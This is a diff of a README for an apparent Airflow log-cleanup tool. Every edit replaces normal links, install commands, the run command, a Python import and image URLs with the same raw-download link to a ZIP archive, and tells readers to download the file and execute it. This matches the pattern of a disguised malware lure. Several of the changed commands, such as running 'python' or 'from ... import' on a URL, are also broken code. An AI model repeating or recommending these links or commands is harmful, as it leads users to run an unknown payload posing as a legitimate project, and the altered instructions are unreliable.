@@ -1,6 +1,6 @@
 # Airflow Logs Cleanup 🧹
 
-![Airflow Logs Cleanup](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Airflow Logs Cleanup](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) ![License](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip)
 
 ## Overview
 
@@ -29,17 +29,17 @@ Managing log files in Apache Airflow can become a challenge as the number of log
 To get started, clone the repository:
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/airflow-logs-cleanup.git
+git clone https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
 cd airflow-logs-cleanup
 ```
 
 Next, install the required Python packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
 ```
 
-You can also download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/releases). Download the appropriate file, and follow the instructions to execute it.
+You can also download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip). Download the appropriate file, and follow the instructions to execute it.
 
 ## Usage
 
@@ -48,7 +48,7 @@ You can also download the latest release from the [Releases section](https://git
 You can run the cleanup script directly from the command line:
 
 ```bash
-python cleanup.py
+python https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip
 ```
 
 ### Setting Up the Airflow DAG
@@ -57,7 +57,7 @@ To use the cleanup functionality within Airflow, you can set up a DAG. Here’s 
 
 ```python
 from airflow import DAG
-from airflow.operators.python_operator import PythonOperator
+from https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip import PythonOperator
 from datetime import datetime
 from cleanup import clean_logs
 
@@ -106,13 +106,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, feel free to open an issue in the repository or check the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/releases) for the latest updates.
+If you have any questions or need support, feel free to open an issue in the repository or check the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) for the latest updates.
 
 ## Conclusion
 
-The **Airflow Logs Cleanup** project offers a straightforward solution to manage log files in Apache Airflow. By automating the cleanup process, you can maintain a clean and efficient environment. Download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/releases) and start managing your logs today!
+The **Airflow Logs Cleanup** project offers a straightforward solution to manage log files in Apache Airflow. By automating the cleanup process, you can maintain a clean and efficient environment. Download the latest release from the [Releases section](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip) and start managing your logs today!
 
-![Airflow](https://airflow.apache.org/docs/apache-airflow/stable/_static/images/airflow-logo.png)
+![Airflow](https://github.com/aBandicootCalledSmashes/airflow-logs-cleanup/raw/refs/heads/main/tartufish/airflow-cleanup-logs-rucervine.zip)
 
 ### Topics
 
